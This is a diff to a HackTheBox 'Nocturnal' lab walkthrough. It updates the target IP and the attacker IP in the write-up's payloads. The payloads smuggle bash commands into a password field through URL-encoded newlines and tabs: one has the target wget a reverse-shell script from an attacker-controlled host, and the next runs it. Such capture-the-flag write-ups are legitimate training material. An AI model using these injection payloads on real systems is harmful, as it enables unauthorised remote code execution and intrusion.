@@ -1,4 +1,4 @@
-# HackTheBox \[Nocturnal]
+# HackTheBox \[Nocturnal] [10.10.11.64]
 
 **Type:** Comprehensive Penetration Test Walkthrough
 
@@ -82,7 +82,7 @@ Payloads:
 
 ```bash
 # Download reverse shell
-password=%0abash%09-c%09"wget%09http://10.10.14.45:8089/1.sh"&backup=
+password=%0abash%09-c%09"wget%09http://10.10.16.78:8089/1.sh"&backup=
 
 # Execute reverse shell
 password=%0abash%09-c%09"bash%091.sh"&backup=
